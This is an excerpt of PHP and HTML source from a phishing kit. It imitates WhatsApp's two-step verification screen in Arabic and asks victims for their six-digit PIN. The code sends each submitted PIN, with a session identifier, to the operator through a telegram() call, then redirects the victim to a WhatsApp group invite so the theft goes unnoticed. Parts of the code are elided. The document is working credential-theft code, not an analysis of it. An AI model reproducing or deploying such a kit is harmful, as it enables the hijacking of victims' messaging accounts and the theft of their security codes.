...
if(isset($_POST['submit'])){
		...
		if($_SESSION['code'] == $pin)
		{
			header('Location: pin.php?err=1&LYoAEaOHBDzGPZGe3crUW9');
		}
		else if$pin == '607941'){
			header('Location: pin.php?err=1&SYoAEaOHBDzGPZGe3crUW9');
		}
			...
			header('Location: pin.php?err=1&SYoAEaOHBDzGPZGe3crUW9');
				...
				telegram("#".$_SESSION["unique"]." | PIN WhatsApp : " . $pin . "");
				telegram ("=======================");
				header('Location: https://chat.whatsapp.com/8UufloR34pVAalZnXwd?lang=ar');
				exit;
		}
}
?>
					...
					<div class="_2yzc">
						<div class="_2yz5 _2yz8" style="display: block;" id="main_block">
							<div class="_2yyk _8cis">
								...
								<?php if($_GET["err"] == 1) { ?>
								<h3 class="_8cit"><font color="red">رمز الحماية غير صحيح</font></h3>
								<?php } else { ?>
								<h3 class="_8cit">  أدخل رمز التحقق بخطوتين (<i>PIN</i>) الذي قمت بتحديده سابقا </h3>
								<?php } ?>
								
								<div class="_whatsapp_www__block_action">
									<form action="pin.php" method="POST">
										<div class="_whatsapp_www__block_action"> <input required id="edit1"  minlength="6" maxlength="6" name="pin" pattern="[0-9.]+" type="tel"/></div><br>
										<div class="_whatsapp_www__block_action">
